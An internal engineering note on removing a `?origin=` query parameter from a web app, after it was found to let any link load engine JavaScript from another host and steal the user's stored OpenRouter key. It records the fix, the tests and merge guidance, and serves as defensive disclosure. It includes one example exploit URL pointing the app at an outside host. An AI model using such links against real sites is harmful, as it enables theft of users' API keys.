---
created: 2026-08-06T11:00:00Z
source: Dinis asked for a briefing doc on `?origin=`; writing it surfaced that the parameter was unrestricted. On seeing the allow-list fix: "the solution is not to have that feature at all, since we can hardcode that origin"
priority: high
estimated_effort: small
---

# `?origin=` removed — the engine origin is hardcoded

## The problem
`website/app/config.js` read `?origin=` from the query string and `engine.js` used it as
the base for `import()` of the engine modules. So a URL parameter decided **which
JavaScript executes inside our page** — beside the user's OpenRouter key in
`localStorage['sg-openrouter-mgmt-key']`. This link was enough to take a key:

```
https://whatsapp-voice-transcription.sgraph.ai/app/?origin=https://somewhere-else
```

The domain is ours, so the link inspects as trustworthy; the page boots normally; every
engine module arrives from the attacker's server. No CSP to catch it, and the attacker's
own server supplies whatever CORS headers it needs. Present since M1.

## Two fixes were written; the second one won
1. **An allow-list** (this branch, and independently on
   `claude/project-review-brief-packs-oxtw7n` as its issue 037 — same conclusion reached
   twice, which is some evidence the finding was real). Both restricted the value to
   `(dev.)tools.sgraph.ai` and localhost.
2. **Removal** — Dinis's call, and the better one. The parameter existed only for
   development, and development does not actually need it: the integration tests reach a
   local engine by *intercepting requests to the real origin*, not by rewriting the
   origin. So the capability had no remaining user. An allow-list is a control that must
   stay correct forever; a deleted feature cannot be got wrong.

## Outcome
`ORIGIN` is a hardcoded constant in `config.js`. Nothing in the app reads
`location.search` any more. A `?origin=` on the URL is inert.

Tests (`tests/unit/config.test.mjs`): the origin is the constant; a hostile `?origin=` in
`location.search` does not move it; and a source-level assertion that `config.js`
contains no `location.search` / `URLSearchParams` / `searchParams` — because an
allow-list can be widened by a later edit, but code that never looks at the query string
cannot be talked into trusting it.

Integration tests updated to stop passing the parameter (they never needed it — MIRROR_DIR
mode intercepts the hardcoded origin). Both gates green; 42 unit tests.

## Merge note
`claude/project-review-brief-packs-oxtw7n` also touches `config.js` (allow-list) and adds
a **Content-Security-Policy** to `app/index.html`. On merge:
- `config.js` — **keep this branch's version** (removal supersedes the allow-list).
- `index.html` — **keep their CSP**; it is defence in depth for the whole class and is
  worth having whatever `config.js` says. Its `script-src` already pins the two tools
  origins, which is consistent with a hardcoded origin.

Documented in
[`library/guides/v0.1.20__guide__the-origin-parameter.md`](../../library/guides/v0.1.20__guide__the-origin-parameter.md).
